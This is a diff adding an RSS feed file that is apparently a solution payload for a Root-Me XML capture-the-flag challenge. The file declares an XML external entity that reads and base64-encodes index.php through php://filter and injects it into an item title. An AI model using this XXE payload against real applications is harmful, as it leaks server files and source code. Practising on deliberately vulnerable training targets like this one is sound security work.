@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]>
+<rss version="2.0">
+<channel>
+<title>Ajax et XML</title>
+<link>http://challenge01.root-me.org/web-serveur/ch29/</link>
+<description>L'interface graphique XML etc...</description>
+<image>
+<url>http:///www.lhttp://challenge01.root-me.org/web-serveur/ch29/</url>
+<link>http://challenge01.root-me.org/web-serveur/ch29/index.php</link>
+</image>
+<item>
+<title>&xxe;</title>
+<link>http://challenge01.root-me.org/web-serveur/ch29/index.php</link>
+<description>Hello Wordl</description>
+</item>
+</channel>
+</rss>
